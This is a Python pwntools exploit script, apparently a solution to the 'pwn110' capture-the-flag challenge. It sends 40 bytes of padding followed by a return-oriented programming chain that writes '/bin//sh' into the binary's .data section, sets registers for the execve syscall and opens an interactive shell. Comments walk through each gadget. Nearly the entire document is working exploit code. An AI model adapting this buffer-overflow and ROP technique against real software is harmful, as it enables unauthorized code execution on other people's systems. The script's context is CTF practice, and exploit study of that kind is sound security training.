from pwn import *

elf = context.binary = ELF('./pwn110-1644300525386.pwn110', checksec=False)
context.log_level = 'debug'

io = process()

offset = 40
data_location = 0x004c00e0



### Requires the use of execve syscall which uses (RDI, RSI, RDX, RAX)
## "Writing what to where" (Writing 'binsh' to '.data' section)

## We will attempt to fill:

## RAX = execve's syscall number which is '59'
## RDI = string we want to enter "/bin//sh"
## RSI = 0 (NULL)
## RDX = 0 (NULL)


## Populate the RDI with Data location, RAX with string value and MOV them and then proceed to call execve




pop_rdi = 0x40191a
pop_rsi = 0x40f4de
binsh = b'/bin//sh'
mov_rdi_rsi = 0x44629f
pop_rdx = 0x40181f
pop_rax = 0x4497d7
syscall = 0x4173d4

payload = flat(
	b'A' * offset,
	pop_rdi,
	data_location,
	pop_rsi,			# We dont really care what pop to use just needs the same one when using the MOV instruction
	binsh,
	mov_rdi_rsi,		# mov qword ptr [rdi], rsi; ret;
	pop_rsi,
	0,
	pop_rdx,
	0,
	pop_rax,
	59,
	syscall,			# syscall; ret;
)


io.sendline(payload)
io.interactive()



